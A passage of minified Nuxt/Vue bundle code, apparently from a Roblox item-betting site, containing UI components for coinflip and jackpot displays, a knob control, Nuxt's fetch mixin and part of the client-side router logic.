        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    label: {
                        type: String,
                        default: "Submit"
                    }
                }
            },
            o = r(0),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement;
                return (this._self._c || t)("input", {
                    staticClass: "btn btn-blue",
                    attrs: {
                        type: "submit"
                    },
                    domProps: {
                        value: this.label
                    }
                })
            }), [], !1, null, null, null);
        e.default = component.exports
    }, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , function(t, e, r) {
        var content = r(396);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("289c494f", content, !0, {
            sourceMap: !1
        })
    }, , , , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    jackpot: {
                        type: Object,
                        required: !0
                    }
                },
                computed: {
                    avatarBorderStyle: function() {
                        return "border-color: ".concat(this.$util.parseRGBA(this.jackpot.winner.ticket.color))
                    }
                }
            },
            o = (r(307), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "jackpot-history-list__item"
                }, [r("div", {
                    staticClass: "item__player"
                }, [r("div", {
                    staticClass: "player__avatar"
                }, [r("NuxtLink", {
                    attrs: {
                        to: "/profiles/" + t.jackpot.winner.userId
                    }
                }, [r("img", {
                    staticClass: "avatar__img",
                    style: t.avatarBorderStyle,
                    attrs: {
                        width: "60px",
                        src: t.$util.getUserThumbnail(t.jackpot.winner.userId)
                    }
                })])], 1), t._v(" "), r("div", {
                    staticClass: "player__username"
                }, [t._v(t._s(t.jackpot.winner.username))])]), t._v(" "), r("div", {
                    staticClass: "item__stat lg primary"
                }, [r("span", {
                    staticClass: "stat__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "trophy"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "stat__value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.jackpot.totalValue - t.jackpot.feeValue)))])]), t._v(" "), r("div", {
                    staticClass: "item__stat md secondary"
                }, [r("span", {
                    staticClass: "stat__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "percent"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "stat__value"
                }, [t._v(t._s(t._f("smallDecimal")(t.jackpot.winner.ticket.percentage)))])]), t._v(" "), r("div", {
                    staticClass: "item__stat sm default"
                }, [r("span", {
                    staticClass: "stat__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "cubes"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "stat__value"
                }, [r("div", {
                    staticClass: "asset-list"
                }, [t._l(t.jackpot.userAssets.slice(0, 3), (function(e, i) {
                    return r("a", {
                        key: i,
                        attrs: {
                            href: "https://www.rolimons.com/item/" + e.assetId,
                            target: "_blank"
                        }
                    }, [r("img", {
                        directives: [{
                            name: "tooltip",
                            rawName: "v-tooltip",
                            value: {
                                content: e.userAssetId,
                                trigger: "hover"
                            },
                            expression: "{content: userAsset.userAssetId, trigger: 'hover'}"
                        }],
                        attrs: {
                            src: t.$util.getAssetThumbnail(e.assetId),
                            width: "25px"
                        }
                    })])
                })), t._v(" "), t.jackpot.userAssets.length > 3 ? r("div", {
                    staticClass: "asset-list__placeholder"
                }, [r("span", [t._v("+")]), r("span", [t._v(t._s(t.jackpot.userAssets.length - 3))])]) : t._e()], 2)])]), t._v(" "), r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: t.jackpot._id,
                            trigger: "click"
                        },
                        expression: "{content: jackpot._id, trigger: 'click'}"
                    }],
                    staticClass: "item__stat sm default"
                }, [r("span", {
                    staticClass: "stat__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "hashtag"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "stat__value"
                }, [t._v(t._s(t.jackpot._id.substring(0, 10)) + " ...")])]), t._v(" "), r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: t.jackpot.cryptoData.float,
                            trigger: "click"
                        },
                        expression: "{content: jackpot.cryptoData.float, trigger: 'click'}"
                    }],
                    staticClass: "item__stat sm default"
                }, [r("span", {
                    staticClass: "stat__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "key"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "stat__value"
                }, [t._v(t._s(t.jackpot.cryptoData.secret))])])])
            }), [], !1, null, "3bde3069", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(21), r(17);
        var n = {
                props: {
                    coinflip: {
                        type: Object,
                        required: !0
                    }
                },
                data: function() {
                    return {
                        animationPlayed: !1
                    }
                },
                computed: {
                    creatorUserAssets: function() {
                        var t = this;
                        return this.coinflip.creator.userAssets || this.coinflip.userAssets.filter((function(e) {
                            return e.ownerId == t.coinflip.creator.userId
                        }))
                    },
                    challengerUserAssets: function() {
                        var t = this;
                        return this.coinflip.challenger.userAssets || this.coinflip.userAssets.filter((function(e) {
                            return e.ownerId == t.coinflip.challenger.userId
                        }))
                    },
                    canJoinCoinflip: function() {
                        return this.$auth.loggedIn && this.coinflip.creator.userId != this.$auth.user._id && !this.coinflip.challenger
                    },
                    min: function() {
                        return this.coinflip.totalValue - .1 * this.coinflip.totalValue
                    },
                    max: function() {
                        return this.coinflip.totalValue + .1 * this.coinflip.totalValue
                    },
                    isOver: function() {
                        return this.coinflip.status ? "Completed" == this.coinflip.status : null != this.coinflip.winner
                    }
                },
                methods: {
                    joinCoinflip: function() {
                        var option = "Heads" == this.coinflip.creator.option ? "Tails" : "Heads",
                            path = "/bet?coinflipId=".concat(this.coinflip._id, "&min=").concat(this.min, "&max=").concat(this.max, "&option=").concat(option);
                        this.$router.push(path)
                    }
                }
            },
            o = (r(372), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "coinflip-display"
                }, [r("div", {
                    staticClass: "coinflip-display__header"
                }, [r("CoinflipDisplayUser", {
                    attrs: {
                        "user-id": t.coinflip.creator.userId,
                        username: t.coinflip.creator.username,
                        "user-option": t.coinflip.creator.option,
                        "is-winner": t.animationPlayed && t.coinflip.winner.userId == t.coinflip.creator.userId
                    }
                }), t._v(" "), r("div", {
                    staticClass: "header__state"
                }, ["Open" == t.coinflip.status ? r("Spinner") : t._e(), t._v(" "), "Processing" == t.coinflip.status ? r("CoinflipKnob", {
                    attrs: {
                        size: 200,
                        "text-color": "#fff",
                        "primary-color": "#2196F3",
                        "secondary-color": "rgba(0, 0, 0, .3)"
                    },
                    model: {
                        value: t.coinflip.timeLeft,
                        callback: function(e) {
                            t.$set(t.coinflip, "timeLeft", e)
                        },
                        expression: "coinflip.timeLeft"
                    }
                }) : t._e(), t._v(" "), t.isOver ? r("CoinflipSprite", {
                    attrs: {
                        src: t.$util.getRandomSpriteSheet(t.coinflip.winner.option),
                        w: 512,
                        h: 500,
                        cols: 8,
                        rows: 32
                    },
                    model: {
                        value: t.animationPlayed,
                        callback: function(e) {
                            t.animationPlayed = e
                        },
                        expression: "animationPlayed"
                    }
                }) : t._e()], 1), t._v(" "), t.canJoinCoinflip ? r("div", {
                    staticClass: "coinflip-buttons"
                }, [r("button", {
                    staticClass: "btn btn-pill btn-blue",
                    on: {
                        click: t.joinCoinflip
                    }
                }, [t._v("Join")])]) : t._e(), t._v(" "), t.coinflip.challenger ? r("CoinflipDisplayUser", {
                    attrs: {
                        "user-id": t.coinflip.challenger.userId,
                        username: t.coinflip.challenger.username,
                        "user-option": t.coinflip.challenger.option,
                        "is-winner": t.animationPlayed && t.coinflip.winner.userId == t.coinflip.challenger.userId
                    }
                }) : t._e()], 1), t._v(" "), r("div", {
                    staticClass: "coinflip-display__details"
                }, [r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: t.coinflip._id,
                            trigger: "click"
                        },
                        expression: "{content: coinflip._id, trigger: 'click'}"
                    }],
                    staticClass: "detail"
                }, [r("span", {
                    staticClass: "detail__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "hashtag"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "detail__value"
                }, [t._v(t._s(t.coinflip._id.substring(0, 10)) + " ...")])]), t._v(" "), t.animationPlayed ? r("div", {
                    staticClass: "detail"
                }, [r("span", {
                    staticClass: "detail__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "key"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "detail__value"
                }, [t._v(t._s(t.coinflip.cryptoData.secret))])]) : t._e(), t._v(" "), t.animationPlayed ? r("div", {
                    staticClass: "detail"
                }, [r("span", {
                    staticClass: "detail__label"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "percent"]
                    }
                })], 1), t._v(" "), r("span", {
                    staticClass: "detail__value"
                }, [t._v(t._s(t.coinflip.cryptoData.float))])]) : t._e()]), t._v(" "), r("div", {
                    staticClass: "coinflip-display__user-asset-lists"
                }, [r("CoinflipDisplayUserAssetList", {
                    attrs: {
                        "user-assets": t.creatorUserAssets,
                        "total-value": t.coinflip.totalValue
                    }
                }), t._v(" "), t.coinflip.challenger ? r("CoinflipDisplayUserAssetList", {
                    attrs: {
                        "user-assets": t.challengerUserAssets,
                        "total-value": t.coinflip.totalValue
                    }
                }) : t._e()], 1), t._v(" "), r("div", {
                    staticClass: "coinflip-display__footer"
                }, [t.coinflip.status && "Completed" != t.coinflip.status ? r("div", [r("span", [t._v("Expires At")]), t._v(" "), r("span", [t._v(t._s(new Date(t.coinflip.expiresAt).toUTCString()))])]) : r("div", [r("span", [t._v("Ended At")]), t._v(" "), r("span", [t._v(t._s(new Date(t.coinflip.endedAt).toUTCString()))])])])])
            }), [], !1, null, "f5d48164", null);
        e.default = component.exports;
        installComponents(component, {
            CoinflipDisplayUser: r(436).default,
            Spinner: r(51).default,
            CoinflipKnob: r(248).default,
            CoinflipSprite: r(437).default,
            CoinflipDisplayUserAssetList: r(438).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(21), r(44);
        var n = 4 * Math.PI / 3,
            o = -Math.PI / 3,
            c = function(t, e, r, n, o) {
                return (t - e) * (o - n) / (r - e) + n
            },
            l = {
                data: function() {
                    return {}
                },
                props: {
                    value: {
                        type: Number,
                        required: !0
                    },
                    max: {
                        type: Number,
                        default: 10
                    },
                    min: {
                        type: Number,
                        default: 0
                    },
                    stepSize: {
                        type: Number,
                        default: .001
                    },
                    disabled: {
                        type: Boolean,
                        default: !1
                    },
                    size: {
                        type: Number,
                        default: 100
                    },
                    primaryColor: {
                        type: String,
                        default: "#4299e1"
                    },
                    secondaryColor: {
                        type: String,
                        default: "#a0aec0"
                    },
                    textColor: {
                        type: String,
                        default: "#fff"
                    },
                    strokeWidth: {
                        type: Number,
                        default: 15
                    },
                    valueDisplayFunction: {
                        type: Function,
                        default: function(t) {
                            return t
                        }
                    }
                },
                computed: {
                    rangePath: function() {
                        return "M ".concat(this.minX, " ").concat(this.minY, " A ").concat(40, " ").concat(40, " 0 1 1 ").concat(this.maxX, " ").concat(this.maxY)
                    },
                    valuePath: function() {
                        return "M ".concat(this.zeroX, " ").concat(this.zeroY, " A ").concat(40, " ").concat(40, " 0 ").concat(this.largeArc, " ").concat(this.sweep, " ").concat(this.valueX, " ").concat(this.valueY)
                    },
                    showValue: function() {
                        return this.value >= this.min && this.value <= this.max && !this.disabled
                    },
                    zeroRadians: function() {
                        return this.min > 0 && this.max > 0 ? c(this.min, this.min, this.max, n, o) : c(0, this.min, this.max, n, o)
                    },
                    valueRadians: function() {
                        return c(this.value, this.min, this.max, n, o)
                    },
                    minX: function() {
                        return 50 + 40 * Math.cos(n)
                    },
                    minY: function() {
                        return 50 - 40 * Math.sin(n)
                    },
                    maxX: function() {
                        return 50 + 40 * Math.cos(o)
                    },
                    maxY: function() {
                        return 50 - 40 * Math.sin(o)
                    },
                    zeroX: function() {
                        return 50 + 40 * Math.cos(this.zeroRadians)
                    },
                    zeroY: function() {
                        return 50 - 40 * Math.sin(this.zeroRadians)
                    },
                    valueX: function() {
                        return 50 + 40 * Math.cos(this.valueRadians)
                    },
                    valueY: function() {
                        return 50 - 40 * Math.sin(this.valueRadians)
                    },
                    largeArc: function() {
                        return Math.abs(this.zeroRadians - this.valueRadians) < Math.PI ? 0 : 1
                    },
                    sweep: function() {
                        return this.valueRadians > this.zeroRadians ? 0 : 1
                    },
                    valueDisplay: function() {
                        return this.valueDisplayFunction(this.value)
                    }
                },
                methods: {
                    updatePosition: function(t, e) {
                        var r, l = t - this.size / 2,
                            d = this.size / 2 - e,
                            f = Math.atan2(d, l),
                            m = -Math.PI / 2 - Math.PI / 6;
                        if (f > o) r = c(f, n, o, this.min, this.max);
                        else {
                            if (!(f < m)) return;
                            r = c(f + 2 * Math.PI, n, o, this.min, this.max)
                        }
                        this.$emit("input", Math.round((r - this.min) / this.stepSize) * this.stepSize + this.min)
                    }
                }
            },
            d = (r(291), r(0)),
            component = Object(d.a)(l, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "knob-control",
                    style: {
                        height: t.size - 5 + "px"
                    }
                }, [r("svg", {
                    attrs: {
                        width: t.size,
                        height: t.size,
                        viewBox: "0 0 100 100"
                    }
                }, [r("path", {
                    staticClass: "knob-control__range",
                    attrs: {
                        d: t.rangePath,
                        "stroke-width": t.strokeWidth,
                        stroke: t.secondaryColor
                    }
                }), t._v(" "), t.showValue ? r("path", {
                    staticClass: "knob-control__value",
                    attrs: {
                        d: t.valuePath,
                        "stroke-width": t.strokeWidth,
                        stroke: t.primaryColor
                    }
                }) : t._e(), t._v(" "), t.showValue ? r("text", {
                    staticClass: "knob-control__text-display",
                    attrs: {
                        x: 50,
                        y: 57,
                        "text-anchor": "middle",
                        fill: t.textColor
                    }
                }, [t._v("\n          " + t._s(t.valueDisplay.toFixed(1)) + "\n        ")]) : t._e()])])
            }), [], !1, null, null, null);
        e.default = component.exports
    }, , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        r(26), r(66), r(8);
        var n = r(2),
            o = r(1),
            c = r(5),
            l = window.__NUXT__;

        function d() {
            if (!this._hydrated) return this.$fetch()
        }

        function f() {
            if ((t = this).$vnode && t.$vnode.elm && t.$vnode.elm.dataset && t.$vnode.elm.dataset.fetchKey) {
                var t;
                this._hydrated = !0, this._fetchKey = +this.$vnode.elm.dataset.fetchKey;
                var data = l.fetch[this._fetchKey];
                if (data && data._error) this.$fetchState.error = data._error;
                else
                    for (var e in data) o.default.set(this.$data, e, data[e])
            }
        }

        function m() {
            var t = this;
            return this._fetchPromise || (this._fetchPromise = h.call(this).then((function() {
                delete t._fetchPromise
            }))), this._fetchPromise
        }

        function h() {
            return _.apply(this, arguments)
        }

        function _() {
            return (_ = Object(n.a)(regeneratorRuntime.mark((function t() {
                var e, r, n, o = this;
                return regeneratorRuntime.wrap((function(t) {
                    for (;;) switch (t.prev = t.next) {
                        case 0:
                            return this.$nuxt.nbFetching++, this.$fetchState.pending = !0, this.$fetchState.error = null, this._hydrated = !1, e = null, r = Date.now(), t.prev = 6, t.next = 9, this.$options.fetch.call(this);
                        case 9:
                            t.next = 15;
                            break;
                        case 11:
                            t.prev = 11, t.t0 = t.catch(6), e = Object(c.o)(t.t0);
                        case 15:
                            if (!((n = this._fetchDelay - (Date.now() - r)) > 0)) {
                                t.next = 19;
                                break
                            }
                            return t.next = 19, new Promise((function(t) {
                                return setTimeout(t, n)
                            }));
                        case 19:
                            this.$fetchState.error = e, this.$fetchState.pending = !1, this.$fetchState.timestamp = Date.now(), this.$nextTick((function() {
                                return o.$nuxt.nbFetching--
                            }));
                        case 23:
                        case "end":
                            return t.stop()
                    }
                }), t, this, [
                    [6, 11]
                ])
            })))).apply(this, arguments)
        }
        e.a = {
            beforeCreate: function() {
                Object(c.l)(this) && (this._fetchDelay = "number" == typeof this.$options.fetchDelay ? this.$options.fetchDelay : 200, o.default.util.defineReactive(this, "$fetchState", {
                    pending: !1,
                    error: null,
                    timestamp: Date.now()
                }), this.$fetch = m.bind(this), Object(c.a)(this, "created", f), Object(c.a)(this, "beforeMount", d))
            }
        }
    }, function(t, e, r) {
        r(263), t.exports = r(264)
    }, , function(t, e, r) {
        "use strict";
        r.r(e),
            function(t) {
                r(19), r(55), r(56), r(21), r(17), r(29), r(57), r(40), r(65), r(41), r(209), r(30), r(34), r(26), r(35), r(42), r(43), r(48), r(270), r(31), r(58), r(66);
                var e = r(62),
                    n = (r(8), r(2)),
                    o = (r(177), r(271), r(276), r(277), r(1)),
                    c = r(249),
                    l = r(84),
                    d = r(5),
                    f = r(52),
                    m = r(261),
                    h = r(155);

                function _(t, e) {
                    var r;
                    if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                        if (Array.isArray(t) || (r = function(t, e) {
                                if (!t) return;
                                if ("string" == typeof t) return v(t, e);
                                var r = Object.prototype.toString.call(t).slice(8, -1);
                                "Object" === r && t.constructor && (r = t.constructor.name);
                                if ("Map" === r || "Set" === r) return Array.from(t);
                                if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return v(t, e)
                            }(t)) || e && t && "number" == typeof t.length) {
                            r && (t = r);
                            var i = 0,
                                n = function() {};
                            return {
                                s: n,
                                n: function() {
                                    return i >= t.length ? {
                                        done: !0
                                    } : {
                                        done: !1,
                                        value: t[i++]
                                    }
                                },
                                e: function(t) {
                                    throw t
                                },
                                f: n
                            }
                        }
                        throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                    }
                    var o, c = !0,
                        l = !1;
                    return {
                        s: function() {
                            r = t[Symbol.iterator]()
                        },
                        n: function() {
                            var t = r.next();
                            return c = t.done, t
                        },
                        e: function(t) {
                            l = !0, o = t
                        },
                        f: function() {
                            try {
                                c || null == r.return || r.return()
                            } finally {
                                if (l) throw o
                            }
                        }
                    }
                }

                function v(t, e) {
                    (null == e || e > t.length) && (e = t.length);
                    for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
                    return r
                }
                o.default.__nuxt__fetch__mixin__ || (o.default.mixin(m.a), o.default.__nuxt__fetch__mixin__ = !0), o.default.component(h.a.name, h.a), o.default.component("NLink", h.a), t.fetch || (t.fetch = c.a);
                var y, x, w = [],
                    k = window.__NUXT__ || {};
                Object.assign(o.default.config, {
                    silent: !0,
                    performance: !1
                });
                var C = o.default.config.errorHandler || console.error;

                function A(t, e, r) {
                    for (var n = function(component) {
                            var t = function(component, t) {
                                if (!component || !component.options || !component.options[t]) return {};
                                var option = component.options[t];
                                if ("function" == typeof option) {
                                    for (var e = arguments.length, r = new Array(e > 2 ? e - 2 : 0), n = 2; n < e; n++) r[n - 2] = arguments[n];
                                    return option.apply(void 0, r)
                                }
                                return option
                            }(component, "transition", e, r) || {};
                            return "string" == typeof t ? {
                                name: t
                            } : t
                        }, o = r ? Object(d.g)(r) : [], c = Math.max(t.length, o.length), l = [], f = function(i) {
                            var e = Object.assign({}, n(t[i])),
                                r = Object.assign({}, n(o[i]));
                            Object.keys(e).filter((function(t) {
                                return void 0 !== e[t] && !t.toLowerCase().includes("leave")
                            })).forEach((function(t) {
                                r[t] = e[t]
                            })), l.push(r)
                        }, i = 0; i < c; i++) f(i);
                    return l
                }

                function j(t, e, r) {
                    return $.apply(this, arguments)
                }

                function $() {
                    return ($ = Object(n.a)(regeneratorRuntime.mark((function t(e, r, n) {
                        var o, c, l, f, m = this;
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    if (this._routeChanged = Boolean(y.nuxt.err) || r.name !== e.name, this._paramChanged = !this._routeChanged && r.path !== e.path, this._queryChanged = !this._paramChanged && r.fullPath !== e.fullPath, this._diffQuery = this._queryChanged ? Object(d.i)(e.query, r.query) : [], (this._routeChanged || this._paramChanged) && this.$loading.start && !this.$loading.manual && this.$loading.start(), t.prev = 5, !this._queryChanged) {
                                        t.next = 12;
                                        break
                                    }
                                    return t.next = 9, Object(d.q)(e, (function(t, e) {
                                        return {
                                            Component: t,
                                            instance: e
                                        }
                                    }));
                                case 9:
                                    o = t.sent, o.some((function(t) {
                                        var n = t.Component,
                                            o = t.instance,
                                            c = n.options.watchQuery;
                                        return !0 === c || (Array.isArray(c) ? c.some((function(t) {
                                            return m._diffQuery[t]
                                        })) : "function" == typeof c && c.apply(o, [e.query, r.query]))
                                    })) && this.$loading.start && !this.$loading.manual && this.$loading.start();
                                case 12:
                                    n(), t.next = 26;
                                    break;
                                case 15:
                                    if (t.prev = 15, t.t0 = t.catch(5), c = t.t0 || {}, l = c.statusCode || c.status || c.response && c.response.status || 500, f = c.message || "", !/^Loading( CSS)? chunk (\d)+ failed\./.test(f)) {
                                        t.next = 23;
                                        break
                                    }
                                    return window.location.reload(!0), t.abrupt("return");
                                case 23:
                                    this.error({
                                        statusCode: l,
                                        message: f
                                    }), this.$nuxt.$emit("routeChanged", e, r, c), n();
                                case 26:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this, [
                            [5, 15]
                        ])
                    })))).apply(this, arguments)
                }

                function O(t, e) {
                    return k.serverRendered && e && Object(d.b)(t, e), t._Ctor = t, t
                }

                function S(t) {
                    var path = Object(d.f)(t.options.base, t.options.mode);
                    return Object(d.d)(t.match(path), function() {
                        var t = Object(n.a)(regeneratorRuntime.mark((function t(e, r, n, o, c) {
                            var l;
                            return regeneratorRuntime.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                        if ("function" != typeof e || e.options) {
                                            t.next = 4;
                                            break
                                        }
                                        return t.next = 3, e();
                                    case 3:
                                        e = t.sent;
                                    case 4:
                                        return l = O(Object(d.r)(e), k.data ? k.data[c] : null), n.components[o] = l, t.abrupt("return", l);
                                    case 7:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        })));
                        return function(e, r, n, o, c) {
                            return t.apply(this, arguments)
                        }
                    }())
                }

                function R(t, e, r) {
                    var n = this,
                        o = [],
                        c = !1;
                    if (void 0 !== r && (o = [], (r = Object(d.r)(r)).options.middleware && (o = o.concat(r.options.middleware)), t.forEach((function(t) {
                            t.options.middleware && (o = o.concat(t.options.middleware))
                        }))), o = o.map((function(t) {
                            return "function" == typeof t ? t : ("function" != typeof l.a[t] && (c = !0, n.error({
                                statusCode: 500,
                                message: "Unknown middleware " + t
                            })), l.a[t])
                        })), !c) return Object(d.n)(o, e)
                }

                function I(t, e, r) {
                    return E.apply(this, arguments)
                }

                function E() {
                    return (E = Object(n.a)(regeneratorRuntime.mark((function t(e, r, o) {
                        var c, l, m, h, v, x, k, C, j, $, O, S, I, E, P, T = this;
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    if (!1 !== this._routeChanged || !1 !== this._paramChanged || !1 !== this._queryChanged) {
                                        t.next = 2;
                                        break
                                    }
                                    return t.abrupt("return", o());
                                case 2:
                                    return !1, e === r ? (w = [], !0) : (c = [], w = Object(d.g)(r, c).map((function(t, i) {
                                        return Object(d.c)(r.matched[c[i]].path)(r.params)
                                    }))), l = !1, m = function(path) {
                                        r.path === path.path && T.$loading.finish && T.$loading.finish(), r.path !== path.path && T.$loading.pause && T.$loading.pause(), l || (l = !0, o(path))
                                    }, t.next = 8, Object(d.s)(y, {
                                        route: e,
                                        from: r,
                                        next: m.bind(this)
                                    });
                                case 8:
                                    if (this._dateLastError = y.nuxt.dateErr, this._hadError = Boolean(y.nuxt.err), h = [], (v = Object(d.g)(e, h)).length) {
                                        t.next = 27;
                                        break
                                    }
                                    return t.next = 15, R.call(this, v, y.context);
                                case 15:
                                    if (!l) {
                                        t.next = 17;
                                        break
                                    }
                                    return t.abrupt("return");
                                case 17:
                                    return x = (f.a.options || f.a).layout, t.next = 20, this.loadLayout("function" == typeof x ? x.call(f.a, y.context) : x);
                                case 20:
                                    return k = t.sent, t.next = 23, R.call(this, v, y.context, k);
                                case 23:
                                    if (!l) {
                                        t.next = 25;
                                        break
                                    }
                                    return t.abrupt("return");
                                case 25:
                                    return y.context.error({
                                        statusCode: 404,
                                        message: "This page could not be found"
                                    }), t.abrupt("return", o());
                                case 27:
                                    return v.forEach((function(t) {
                                        t._Ctor && t._Ctor.options && (t.options.asyncData = t._Ctor.options.asyncData, t.options.fetch = t._Ctor.options.fetch)
                                    })), this.setTransitions(A(v, e, r)), t.prev = 29, t.next = 32, R.call(this, v, y.context);
                                case 32:
                                    if (!l) {
                                        t.next = 34;
                                        break
                                    }
                                    return t.abrupt("return");
                                case 34:
                                    if (!y.context._errored) {
                                        t.next = 36;
                                        break
                                    }
                                    return t.abrupt("return", o());
                                case 36:
                                    return "function" == typeof(C = v[0].options.layout) && (C = C(y.context)), t.next = 40, this.loadLayout(C);
                                case 40:
                                    return C = t.sent, t.next = 43, R.call(this, v, y.context, C);
                                case 43:
                                    if (!l) {
                                        t.next = 45;
                                        break
                                    }
                                    return t.abrupt("return");
                                case 45:
                                    if (!y.context._errored) {
                                        t.next = 47;
                                        break
                                    }
                                    return t.abrupt("return", o());
                                case 47:
                                    j = !0, t.prev = 48, $ = _(v), t.prev = 50, $.s();
                                case 52:
                                    if ((O = $.n()).done) {
                                        t.next = 63;
                                        break
                                    }
                                    if ("function" == typeof(S = O.value).options.validate) {
                                        t.next = 56;
                                        break
                                    }
                                    return t.abrupt("continue", 61);
                                case 56:
                                    return t.next = 58, S.options.validate(y.context);
                                case 58:
                                    if (j = t.sent) {
                                        t.next = 61;
                                        break
                                    }
                                    return t.abrupt("break", 63);
                                case 61:
                                    t.next = 52;
                                    break;
                                case 63:
                                    t.next = 68;
                                    break;
                                case 65:
                                    t.prev = 65, t.t0 = t.catch(50), $.e(t.t0);
                                case 68:
                                    return t.prev = 68, $.f(), t.finish(68);
                                case 71:
                                    t.next = 77;
                                    break;
                                case 73:
                                    return t.prev = 73, t.t1 = t.catch(48), this.error({
                                        statusCode: t.t1.statusCode || "500",
                                        message: t.t1.message
                                    }), t.abrupt("return", o());
                                case 77:
                                    if (j) {
                                        t.next = 80;
                                        break
                                    }
                                    return this.error({
                                        statusCode: 404,
                                        message: "This page could not be found"
                                    }), t.abrupt("return", o());
                                case 80:
                                    return t.next = 82, Promise.all(v.map(function() {
                                        var t = Object(n.a)(regeneratorRuntime.mark((function t(n, i) {
                                            var o, c, l, f, m, _, v, x, p;
                                            return regeneratorRuntime.wrap((function(t) {
                                                for (;;) switch (t.prev = t.next) {
                                                    case 0:
                                                        if (n._path = Object(d.c)(e.matched[h[i]].path)(e.params), n._dataRefresh = !1, o = n._path !== w[i], T._routeChanged && o ? n._dataRefresh = !0 : T._paramChanged && o ? (c = n.options.watchParam, n._dataRefresh = !1 !== c) : T._queryChanged && (!0 === (l = n.options.watchQuery) ? n._dataRefresh = !0 : Array.isArray(l) ? n._dataRefresh = l.some((function(t) {
                                                                return T._diffQuery[t]
                                                            })) : "function" == typeof l && (I || (I = Object(d.h)(e)), n._dataRefresh = l.apply(I[i], [e.query, r.query]))), T._hadError || !T._isMounted || n._dataRefresh) {
                                                            t.next = 6;
                                                            break
                                                        }
                                                        return t.abrupt("return");
                                                    case 6:
                                                        return f = [], m = n.options.asyncData && "function" == typeof n.options.asyncData, _ = Boolean(n.options.fetch) && n.options.fetch.length, v = m && _ ? 30 : 45, m && ((x = Object(d.p)(n.options.asyncData, y.context)).then((function(t) {
                                                            Object(d.b)(n, t), T.$loading.increase && T.$loading.increase(v)
                                                        })), f.push(x)), T.$loading.manual = !1 === n.options.loading, _ && ((p = n.options.fetch(y.context)) && (p instanceof Promise || "function" == typeof p.then) || (p = Promise.resolve(p)), p.then((function(t) {
                                                            T.$loading.increase && T.$loading.increase(v)
                                                        })), f.push(p)), t.abrupt("return", Promise.all(f));
                                                    case 14:
                                                    case "end":
                                                        return t.stop()
                                                }
                                            }), t)
                                        })));
                                        return function(e, r) {
                                            return t.apply(this, arguments)
                                        }
                                    }()));
                                case 82:
                                    l || (this.$loading.finish && !this.$loading.manual && this.$loading.finish(), o()), t.next = 99;
                                    break;
                                case 85:
                                    if (t.prev = 85, t.t2 = t.catch(29), "ERR_REDIRECT" !== (E = t.t2 || {}).message) {
                                        t.next = 90;
                                        break
                                    }
                                    return t.abrupt("return", this.$nuxt.$emit("routeChanged", e, r, E));
                                case 90:
                                    return w = [], Object(d.k)(E), "function" == typeof(P = (f.a.options || f.a).layout) && (P = P(y.context)), t.next = 96, this.loadLayout(P);
                                case 96:
                                    this.error(E), this.$nuxt.$emit("routeChanged", e, r, E), o();
                                case 99:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this, [
                            [29, 85],
                            [48, 73],
                            [50, 65, 68, 71]
                        ])
                    })))).apply(this, arguments)
                }

                function P(t, r) {
                    Object(d.d)(t, (function(t, r, n, c) {
                        return "object" !== Object(e.a)(t) || t.options || ((t = o.default.extend(t))._Ctor = t, n.components[c] = t), t
                    }))
                }

                function T(t) {
                    var e = Boolean(this.$options.nuxt.err);
                    this._hadError && this._dateLastError === this.$options.nuxt.dateErr && (e = !1);
                    var r = e ? (f.a.options || f.a).layout : t.matched[0].components.default.options.layout;
                    "function" == typeof r && (r = r(y.context)), this.setLayout(r)
                }

                function N(t) {
